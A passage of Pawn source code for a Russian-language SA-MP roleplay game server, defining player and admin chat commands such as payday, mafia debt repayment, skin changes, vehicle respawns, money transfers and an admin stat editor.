	SCM(giveplayerid, 0x6495EDFF, string);
	return true;
}
CMD:givepayday(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid;
	if(Prorab[playerid] == false) return SCM(playerid,COLOR_GREY, " Сначала надо переодеться");
	if(sscanf(params, "u", giveplayerid)) return SCM(playerid,-1, " Введите: /gpayday [ID].");
	if(Employer[giveplayerid] != playerid) return SCM(playerid,COLOR_GREY, " Игрок не работает под вашим начальством");
	if(Works[giveplayerid] == false) return SCM(playerid,COLOR_GREY, " Игрок не на работе.");
	if(JobAmmount[giveplayerid] == 0) return SCM(playerid,COLOR_GREY, " Игрок не перенес ни одного мешка.");
	if(!IsPlayerConnected(giveplayerid)) return SCM(playerid,COLOR_GREY, " Игрок не в сети");
	if(!ProxDetectorS(5.0, playerid, giveplayerid)) return SCM(playerid,COLOR_GREY, " Ошибка. Вы должны находиться рядом с игроком");
	PTEMP[playerid][pCash] +=JobAmmount[giveplayerid]*50;
	format(YCMDstr, sizeof(YCMDstr), "~g~+%d$", JobAmmount[playerid]*25);
	GameTextForPlayer(giveplayerid, YCMDstr, 3000, 1);
	SCM(playerid,COLOR_GREEN,"Спасибо за работу, приходите еще!");
	JobAmmount[giveplayerid] = 0; Employer[giveplayerid] = 999;
	return true;
}
CMD:repaydebt(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] == 0) return true;
	if(PTEMP[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, "Не достаточная сумма, для возврата долга!");
	switch(PTEMP[playerid][pKrisha])
	{
	case 6:
		{
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён мафии Yakuza!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PTEMP[playerid][pName],PTEMP[playerid][pDolg]);
			SendFamilyMessage(6,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nYakuza] +=PTEMP[playerid][pDolg] ;
			PTEMP[playerid][pDolg] = 0;
		}
	case 5:
		{
			if(PTEMP[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, " Не достаточная сумма, для возврата долга!");
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён LCN!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PTEMP[playerid][pName],PTEMP[playerid][pDolg]);
			SendFamilyMessage(5,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nLcn] +=PTEMP[playerid][pDolg];
			PTEMP[playerid][pDolg] = 0;
		}
	case 14:
		{
			if(PTEMP[playerid][pDolg] < 50) return SCM(playerid, COLOR_GRAD1, " Не достаточная сумма, для возврата долга!");
			SCM(playerid, COLOR_YELLOW, " Долг был возвращён Русской мафии!");
			format(YCMDstr, sizeof(YCMDstr), " %s вернул долг в размере %s вирт",PTEMP[playerid][pName],PTEMP[playerid][pDolg]);
			SendFamilyMessage(14,COLOR_YELLOW2, YCMDstr);
			MafiaBank[0][nRm] +=PTEMP[playerid][pDolg] ;
			PTEMP[playerid][pDolg] = 0;
		}
	}
	return true;
}
CMD:mydebts(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] == 0) return true;
	new mafiatext[20];
	if(PTEMP[playerid][pKrisha] == 6) { mafiatext = "Yakuza"; }
	else if(PTEMP[playerid][pKrisha] == 14) { mafiatext = "RM"; }
	else if(PTEMP[playerid][pKrisha] == 5) { mafiatext = "LCN"; }
	else if(PTEMP[playerid][pKrisha] == 0) { mafiatext = "Нет"; }
	format(YCMDstr,sizeof(YCMDstr), "Крыша: %s\nДолг: %i вирт",
	mafiatext,PTEMP[playerid][pDolg]);
	ShowPlayerDialogEx(playerid,69,DIALOG_STYLE_MSGBOX, "Информация о себе",YCMDstr, "Готово", "");
	return true;
}
CMD:fgstyle(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 6) return true;
	if(!PlayerToPoint(30.0,playerid,768.1588,6.5715,1000.7144)) return 	SCM(playerid, COLOR_GRAD1, " Вы не в спортзале...");
	new listitems[] = " [0] Начать урок по стилю Box\n [1] Начать урок по стилю Kong - Fu\n [2] Начать урок по стилю Kick - Box\n [3] Завершить урок Box\n [4] Завершить урок Kong - Fu\n [5] Завершить урок Kick - Box";
	ShowPlayerDialogEx(playerid, 3439, DIALOG_STYLE_LIST, "Уроки боевых искусств", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:spawn(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	SpawnPlayer(playerid);
	return true;
}
CMD:busdrivers(playerid)
{
	if(!PTEMP[playerid][pLogin]) return true;
	new null[13], str[3000];
	foreach(i)
	{
		if(GetPVarInt(i,"TypeBus")) null[GetPVarInt(i,"TypeBus")]++, null[0]++;
	}
	if(!null[0]) return SCM(playerid,COLOR_GREY," Нет водителей автобуса!");
	null[7] = 100 / null[0] * null[1];
	null[8] = 100 / null[0] * null[2];
	null[9] = 100 / null[0] * null[3];
	null[10] = 100 / null[0] * null[4];
	null[11] = 100 / null[0] * null[5];
	null[12] = 100 / null[0] * null[6];
	format(str,sizeof(str),			"Всего водителей: %i человек\n\n\
									ВнутриГородской ЛС\t\t\t\t[%s]%i%% %i человек\n\
									ВнутриГородской СФ\t\t\t\t[%s]%i%% %i человек\n\
									ВнутриГородской ЛВ\t\t\t\t[%s]%i%% %i человек\n", null[0],
	ToDevelopSkills(null[7], 100 - null[7]), null[7], null[1],
	ToDevelopSkills(null[8], 100 - null[8]), null[8], null[2],
	ToDevelopSkills(null[9], 100 - null[9]), null[9], null[3]);
	format(str,sizeof(str),			"%sАвтоВокзал LS << >> Автошкола SF\t\t[%s]%i%% %i человек\n\
									АвтоВокзал LS << >> АвтоВокзал LV\t\t[%s]%i%% %i человек\n\
									АвтоВокзал LS << >> Заводы\t\t\t[%s]%i%% %i человек", str,
	ToDevelopSkills(null[10], 100 - null[10]), null[10], null[4],
	ToDevelopSkills(null[11], 100 - null[11]), null[11], null[5],
	ToDevelopSkills(null[12], 100 - null[12]), null[12], null[6]);
	return ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX," ",str,"Готово","");
}
CMD:ratingnews(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	radioall = 0;
	new points[3];
	new stringskill[600];
	new ratingGNews = 0;
	new ratingLNews = 0;
	new ratingLvNews = 0;
	new procls = 0, procsf = 0, proclv = 0;
	foreach(i)
	{
		if(gNews[i] == 0) ratingGNews++, radioall++;
		if(lNews[i] == 0) ratingLNews++, radioall++;
		if(LvNews[i] == 0) ratingLvNews++, radioall++;
	}
	procls = 100 / radioall * ratingLNews;
	procsf = 100 / radioall * ratingGNews;
	proclv = 100 / radioall * ratingLvNews;
	points[0] = 100 - procls;
	points[1] = 100 - procsf;
	points[2] = 100 - proclv;
	format(stringskill,999,"<< Количество слушателей >>\n\nLS News:\t[%s]%i%% %i человек\nSF News:\t[%s]%i%% %i человек\nLV News:\t[%s]%i%% %i человек",
	ToDevelopSkills(procls,points[0]),procls,ratingLNews,
	ToDevelopSkills(procsf,points[1]),procsf,ratingGNews,
	ToDevelopSkills(proclv,points[2]),proclv,ratingLvNews);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX,"Сообщение",stringskill,"Выбрать","Назад");
	return true;
}
CMD:spcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY," Вы не в машине");
	SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	return true;
}
CMD:spcars(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new value, radius = 60;
	if(sscanf(params, "d",value))
	{
		SCM(playerid, -1, " Введите: /spcars [количество] по умолчанию радиус 60.0");
		//SCM(playerid, -1, " [1] - все | [2] - кроме домашних | [3] - незанятые | [4] - кроме своей | [5] - админские");
		SCM(playerid, -1, " [1]-все [2]-кроме домашних [3]-кроме тех, где есть водитель");
		SCM(playerid, -1, " [4]-кроме своей [5]-админские");
		return true;
	}
	new Float:x1, Float:y1, Float:z1;
	switch(value)
	{
	    case 1:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 2:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            new bool:is = false;
				foreach(j)
	            {
	            	if(i == house_car[j])
					{
						is = true;
						break;
					}
            	}
            	if(is) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 3:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            if(!IsVehicleOccupied(i)) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 4:
	    {
	    	for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
	            if(GetPlayerVehicleID(playerid) == i) continue;
				SetVehicleToRespawn(i);
	        }
	    }
	    case 5:
	    {
	        for(new i = 0; i < MAX_VEHICLES; i++)
	        {
	            GetVehiclePos(i, x1, y1, z1);
	            if(!IsPlayerInRangeOfPoint(playerid, radius+2, x1, y1, z1)) continue;
             	if(SERVERCARID[i]) continue;
             	SetVehicleToRespawn(i);
	        }
	    }
        default: return SCM(playerid, COLOR_GREY, " Не правильное значение");
	}
	SCM(playerid,COLOR_BLUE," Машины заспавнены");
	format(YCMDstr,sizeof(YCMDstr)," Администратор: %s заспавнил машины",Name(playerid));
	printf("Администратор %s заспавнил машины [code: %i]", Name(playerid), value);
	return ProxDetector(radius, playerid, YCMDstr, COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED,COLOR_LIGHTRED);
}
CMD:cc(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	for(new i = 0; i < 60; i++) SendClientMessageToAll(-1, " ");
	printf("Администратор %s очистил чат");
	return true;
}
CMD:cclear(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 0; i < 60; i++) SCM(playerid, -1, " ");
	return true;
}
CMD:free(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] == 7 && PTEMP[playerid][pRank] == 2)
	{
		if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /free [id] [цена]");
		if(PTEMP[params[0]][pJailTime] <= 2) return SCM(playerid, COLOR_GRAD1, " Человек не в тюрьме!");
		if(params[1] < 1 || params[1] > 50000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 50000!"); return true; }
		if(params[1] == playerid)  return  SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
		format(YCMDstr, sizeof(YCMDstr), " [Адвокат] Вы предложили %s выпустить его за %i вирт",Name(params[0]),params[1]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " [Адвокат] %s предлагает Вам свободу за %i вирт",PTEMP[playerid][pName],params[1]);
		SCM(params[0], 0x6495EDFF, YCMDstr);
		ShowPlayerDialogEx(params[0],6622,DIALOG_STYLE_MSGBOX, "Адвокатские услуги", "Выберите способ оплаты:", "Наличные", "Банк");
		FreeOffer[params[0]] = playerid;
		FreePrice[params[0]] = params[1];
		SposobOffer[params[0]] = 0;
	}
	else return SCM(playerid, COLOR_GREY, " Вы не адвокат");
	return true;
}
CMD:selleat(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pJob] != 3) return true;
	if(sscanf(params, "u", params[0])) return	SCM(playerid, -1, " Введите: /selleat [playerid]");
	if((GetPlayerVehicleID(playerid) < hotdogcar[0] || GetPlayerVehicleID(playerid) > hotdogcar[1]) && !GetPVarInt(playerid,"h_stall")) return SCM(playerid,COLOR_GREY," Вы не можете продать хот дог");
	if(!GetPVarInt(playerid,"h_contract")) return SCM(playerid,COLOR_GREY," Вы не заключили контракт с закусочной");
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"rentcar_job") && !GetPVarInt(playerid,"h_stall")) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Игрок должен находиться рядом с вами");
	SendMes(playerid,0x6495EDFF," Вы предложили %s ХотДог за %i вирт",Name(params[0]),GetPVarInt(playerid,"h_price"));
	SendMes(params[0],0x6495EDFF," %s предлагает Вам ХотДог за %i вирт. (( Введите: /(ac)cept hotdog для покупки ХотДога ))",PTEMP[playerid][pName],GetPVarInt(playerid,"h_price"));
	SetPVarInt(params[0],"h_id",playerid+1);
	return true;
}
CMD:setnik(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /setnik [id]");
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(strlen(WantNickChange[params[0]]) < 3) return SCM(playerid,-1, " Этот игрок не хочет менять ник");
	format(YCMDstr,sizeof(YCMDstr), " %s одобрил заявку на смену ника: %s >> %s",Name(playerid),Name(params[0]),WantNickChange[params[0]]);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	SCM(playerid,-1," Ник одобрен");
	mysql_format(DATABASE,QUERY,128,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE Name= '%s'",WantNickChange[params[0]]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",15,params[0],playerid);
	printf("Администратор %s одобрил заявку на смену ника: %s >> %s", Name(playerid), Name(params[0]),WantNickChange[params[0]]);
	return true;
}
CMD:cname(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /cname [id]");
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(!IsAMayor(playerid)) return SCM(playerid,COLOR_GREY," Функция доступна только мэру, заместителю мэра, и секретарю");
	if(strlen(WantNickChange[params[0]]) < 3) return SCM(playerid,-1, "Этот игрок не подавал заявку на смену ника");
	format(YCMDstr,sizeof(YCMDstr), " %s одобрил заявку на смену ника: %s >> %s",Name(playerid),Name(params[0]),WantNickChange[params[0]]);
	SendClientMessageToAll(COLOR_YELLOW,YCMDstr);
	SCM(playerid,-1," Ник одобрен");
	mysql_format(DATABASE,QUERY,128,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE Name= '%s'",WantNickChange[params[0]]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",15,params[0],playerid);
	printf("[CNAME] Мэр %s одобрил заявку на смену ника: %s >> %s", Name(playerid), Name(params[0]),WantNickChange[params[0]]);
	return true;
}
CMD:forceskin(playerid, params[])
{
	if (PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if (sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /forceskin [id]");
	if (!IsPlayerConnected(params[0])) return true;
	if (params[0] == INVALID_PLAYER_ID) return true;
	if (PTEMP[params[0]][pMember] < 1) return SCM(playerid, COLOR_GREY, " Игрок не состоит в организации");

	SCM(params[0], COLOR_BLUE," Вы были допущены к изменению скина администратором Entropy-Rp");
	format(YCMDstr, sizeof (YCMDstr), " Вы допустили %s к изменению скина", Name(params[0]));
	SCM(playerid, COLOR_BLUE, YCMDstr);
	SCM(params[0], COLOR_RED, " Используйте клавишу 'Быстрый бег' (пробел по умолчанию)");
	SCM(params[0], COLOR_RED, " Используйте клавишу 'Вверх, вниз' (W, S по умолчанию)");

	ShowMenuForPlayer(ChoseSkin[0], params[0]);
	SetPlayerInterior(params[0], 5);
	OldSkin[params[0]] = GetPlayerSkin(params[0]);
	ChosenSkin[params[0]] = OldSkin[params[0]];

	SetPlayerVirtualWorld(params[0], 2+random(100));
	SetPlayerPos            (params[0], gInviteSpawns[0]  , gInviteSpawns[1], gInviteSpawns[2]);
	SetPlayerFacingAngle    (params[0], gInviteSpawns[3]                                      );
	SetPlayerCameraPos      (params[0], gInviteSpawns[0]+3, gInviteSpawns[1], gInviteSpawns[2]);
	SetPlayerCameraLookAt   (params[0], gInviteSpawns[0]  , gInviteSpawns[1], gInviteSpawns[2]);
	TogglePlayerControllable(params[0], 0);

	SelectChar[params[0]]   = 255;
	SelectCharID[params[0]] = PTEMP[params[0]][pMember];
	SelectCharPlace[params[0]] = 1;

	printf("Администратор %s заставил %s сменить фракционный скин", Name(playerid), Name(params[0]));
	return true;
}
CMD:setskin(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /setskin [skin_ID]");
	if(params[0] > 311 || params[0] < 1) { SCM(playerid, COLOR_GREY, " ID может быть от 1 до 311"); return true; }
	PTEMP[playerid][pChar][0] = params[0];
	SetPlayerSkin(playerid, PTEMP[playerid][pChar][0]);
	PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0);
	printf("Администратор %s выдал себе скин %i", Name(playerid), params[0]);
	return true;
}
CMD:setplayerskin(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /setplayerskin [playerid] [skin_ID]");
	if(params[1] > 311 || params[1] < 1) { SCM(playerid, COLOR_GREY, " ID может быть от 1 до 311"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	PTEMP[params[0]][pChar][0] = params[1];
	format(YCMDstr, sizeof(YCMDstr), " Вы изменили скин %s на номер: %i",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	SetPlayerSkin(params[0], PTEMP[params[0]][pChar][0]);
	printf("Администратор %s выдал %s скин %i", Name(playerid), Name(params[0]), params[1]);
	return true;
}
CMD:pay(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "ud", params[0],params[1])) return	SCM(playerid, -1, " Введите: /pay [playerid] [сумма]");
	if((params[1] > 1000 && PTEMP[playerid][pLevel] < 1) || (params[1] > 10000 && PTEMP[playerid][pLevel] < 2)) return SCM(playerid, COLOR_GRAD1, " Сумма должна быть от 1 до 1000");
	if(params[1] < 1 || params[1] > 100000) return SCM(playerid, COLOR_GRAD1, " Сумма должна быть от 1 до 100000");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, " Вы слишком далеко!");
	if(GetSRVMoney(playerid) < params[1]) return true;
	PTEMP[params[0]][pCash] += params[1];
	PTEMP[playerid][pCash] -= params[1];
	format(YCMDstr, sizeof(YCMDstr), " Вы передали %s[%i] %i вирт",Name(params[0]),params[0],params[1]);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SCM(playerid, COLOR_GRAD1, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы получили %i вирт от %s[%i]",params[1],PTEMP[playerid][pName], playerid);
	SCM(params[0], COLOR_GRAD1, YCMDstr);
	PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
	format(YCMDstr,sizeof(YCMDstr), "Достал бумажник и передал деньги %s",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	printf("[PAY] %s передал %s %i вирт", PTEMP[playerid][pName], PTEMP[params[0]][pName], params[1]);
	return true;
}
CMD:setmats(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd", params[0],params[1]))
	{
		SCM(playerid, -1, " Введите: /setmats [номер] [количество]");
		SCM(playerid, -1, " [1] - LSPD, [2] - FBI, [3] - SFA, [4] - Yakuza, [5] - LCN, [6] - SFPD, [7] - Ballas, [8] - Vagos");
		SCM(playerid, -1, " [9] - RM, [10] - Grove, [11] - Aztecas, [12] - Rifa, [13] - Army LV, [14] - LVPD");
		SCM(playerid, -1, " [15] - Hell's Angels MC, [16] - Warlocks MC, [17] - Pagans MC");
		return true;
	}
	switch (params[0])
	{
	case 1:
		{
			lspdmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LSPD изменены на: %i", params[1]);
		}
	case 2:
		{
			fbimats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы FBI изменены на: %i", params[1]);
		}
	case 3:
		{
			armmatsf = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы SFA изменены на: %i", params[1]);
		}
	case 4:
		{
			yakuzamats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Yakuza изменены на: %i", params[1]);
		}
	case 5:
		{
			lcnmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LCN изменены на: %i", params[1]);
		}
	case 6:
		{
			sfpdmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы SFPD изменены на: %i", params[1]);
		}
	case 7:
		{
			ballasmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Ballas изменены на: %i", params[1]);
		}
	case 8:
		{
			vagosmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Vagos изменены на: %i", params[1]);
		}
	case 9:
		{
			rmmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы RM изменены на: %i", params[1]);
		}
	case 10:
		{
			groovmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Grove изменены на: %i", params[1]);
		}
	case 11:
		{
			aztekmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Aztecas изменены на: %i", params[1]);
		}
	case 12:
		{
			rifamatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Rifa изменены на: %i", params[1]);
		}
	case 13:
		{
			armmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LVA изменены на: %i", params[1]);
		}
	case 14:
		{
			lvpdmats = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы LVPD изменены на: %i", params[1]);
		}
	case 15:
	    {
	    	hamcmatbi = params[1];
			format(YCMDstr, sizeof(YCMDstr), " Материалы Hell's Angels MC изменены на: %i", params[1]);
	    }
   	case 16:
	    {
	    	wmcmatbi = params[1];
	    	format(YCMDstr, sizeof(YCMDstr), " Материалы Warlocks MC изменены на: %i", params[1]);
	    }
	case 17:
	    {
	    	pmcmatbi = params[1];
	    	format(YCMDstr, sizeof(YCMDstr), " Материалы Pagans MC изменены на: %i", params[1]);
	    }  
	default:
		{
			format(YCMDstr, sizeof(YCMDstr), " [Ошибка] Вы ввели неверное число");
		}
	}
	SCM(playerid, COLOR_GRAD1, YCMDstr);
	printf("Администратор $s установил материалы %i фракции на %i", Name(playerid), params[0], params[1]);
	return true;
}
CMD:setstatcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9) return true;
	if(sscanf(params, "udddd", params[0], params[1], params[2], params[3], params[4])) return SCM(playerid, -1, " Введите: /setstatcar [playerid] [player car id] [carid] [color1] [color2]");
	if(params[0] == INVALID_PLAYER_ID || !IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] < 0 || params[1] > 4) return SCM(playerid, COLOR_GREY, " Номер авто игрока может быть от 0 до 4");
	if(params[2] < 400 || params[2] > 611) return SCM(playerid, COLOR_GREY, " ID авто может быть от 400 до 611");
	if(params[3] < 0 || params[3] > 235) return SCM(playerid, COLOR_GREY, " Цвет может быть от 0 до 235");
	if(params[4] < 0 || params[4] > 235) return SCM(playerid, COLOR_GREY, " Цвет может быть от 0 до 235");
	CarInfo[params[0]][carModel][params[1]] = params[2];
	CarInfo[params[0]][carFuel][params[1]] = 200;
	CarInfo[params[0]][carPercent][params[1]] = 100;
	CarInfo[params[0]][carColor_one][params[1]] = params[3];
	CarInfo[params[0]][carColor_two][params[1]] = params[4];
	format(string, sizeof(string), "/veh %i %i %i", params[2], params[3], params[4]);
	CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	return true;
}
CMD:setstat(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid;
	new stat;
	new amount;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",giveplayerid,stat,amount))
	{
		SCM(playerid, -1, " Введите: /setstat [id] [номер] [количество]");
		SCM(playerid, COLOR_GREY, " [1] Уровень|[2] Законопослушность|[3] Материалы|[4] Скин|[5] Преступлений|[6] Номер телефона");
		SCM(playerid, COLOR_GREY, " [7] Exp|[8] Ключ от дома |[9] Номер бизнеса|[10] VIP [1-3]|[11] Работа игрока|[12] Сытость");
		SCM(playerid, COLOR_GREY, " [13] Деньги в банке|[14] Счёт мобильного|[15] Деньги|[16] Варны|[17] Наркотики");
		SCM(playerid, COLOR_GREY, " [18] Член орг|[19] Донат счётчик|[20] Box|[21] Kong Fu|[22] Kick Box");
		SCM(playerid, COLOR_GREY, " [23] Машина|[24] Цвет авто 1|[25] Цвет авто 2|[26] Наркозависимость|[27] Скин организации");
		SCM(playerid, COLOR_GREY, " [28] Помолвлен на|[29] Проценты Авто|[30] Мастерская|[31] Скилл таксиста|[32] Навык вождения");
		SCM(playerid, COLOR_GREY, " [33] Ключи от камеры|[34] Рейтинг бандита");
		return true;
	}
	if(!IsPlayerConnected(giveplayerid)) return true;
	if(giveplayerid == INVALID_PLAYER_ID) return true;
	switch (stat)
	{
	case 1:
		{
			PTEMP[giveplayerid][pLevel] = amount;
			format(string, 128, " LVL игрока изменён на: %i", amount);
			DollahScoreUpdate(giveplayerid);
		}
	case 2:
		{
			PTEMP[giveplayerid][pZakonp] = amount;
			format(string, 128, " Законопослушность: %i", amount);
		}
	case 3:
		{
			PTEMP[giveplayerid][pMats] = amount;
			format(string, 128, " Материалы: %i", amount);
		}
	case 4:
		{
			PTEMP[giveplayerid][pChar][0] = amount;
			format(string, 128, " Скин игрока установлен на: %i", amount);
		}
	case 5:
		{
			PTEMP[giveplayerid][pCrimes] = amount;
			format(string, 128, " Преступлений: %i", amount);
		}
	case 6:
		{
			PTEMP[giveplayerid][pPnumber] = amount;
			format(string, 128, " Номер телефона игрока изменён на: %i", amount);
		}
	case 7:
		{
			PTEMP[giveplayerid][pExp] = amount;
			format(string, 128, " EXP игрока изменены на: %i", amount);
		}
	case 8:
		{
			PTEMP[giveplayerid][pPHouseKey] = amount;
			format(string, 128, " Дом: %i", amount);
		}
	case 9:
		{
		    BizzInfo[amount][bLocked] = 0;
			BizzInfo[amount][bPrice] = 100;
			BizzInfo[amount][bTill] = 0;
			BizzInfo[amount][bLandTax] = BizzLandTax[amount]*12;
			BizzPay[amount] = 0;
			BizzInfo[amount][bLicense] = 0;
			BizzInfo[amount][bStavka] = 0;
			BizzInfo[amount][bMinStavka] = 0;
			BizzInfo[amount][bTimeStavka] = 0;
			BizzInfo[amount][bLastStavka] = 0;
			BizzInfo[amount][bLockTime] = 0;
			BizzInfo[amount][bEntranceCost] = 100;
			strmid(BizzInfo[amount][bOwner],PTEMP[giveplayerid][pName], 0, 32, 32);
			BGet(giveplayerid), SendMes(giveplayerid,COLOR_GREEN," Вы новый владелец бизнеса %i! {FFFFFF}(( Управление: /mm > Команды сервера ))", amount);
			strmid(BizzInfo[amount][bNameStavka], "-", 0, strlen("-"), 10);
			UpdateBizz(giveplayerid);
			format(string, 128, " Бизнес: %i", amount);
		}
	case 10:
		{
			PTEMP[giveplayerid][pDonateRank] = amount;
			format(string, 128, " VIP аккаунт уровня: %i", amount);
		}
	case 11:
		{
			PTEMP[giveplayerid][pJob] = amount;
			format(string, 128, " Работа: %i", amount);
		}
	case 12:
		{
			PTEMP[giveplayerid][pSatiety] = amount;
			format(string, 128, " Сытость игрока: %i", amount);
		}
	case 13:
		{
			PTEMP[giveplayerid][pBank] = amount;
			format(string, 128, " Деньги в банке изменены на: %i вирт", amount);
		}
	case 14:
		{
			PTEMP[giveplayerid][pMobile] = amount;
			format(string, 128, " Счёт мобильного: %i вирт", amount);
		}
	case 15:
		{
			PTEMP[giveplayerid][pCash] = amount;
			format(string, 128, " Деньги изменены на: %i вирт", amount);
		}
	case 16:
		{
			PTEMP[giveplayerid][pWarns] = amount;
			format(string, 128, " Количество варнов изменено на: %i", amount);
		}
	case 17:
		{
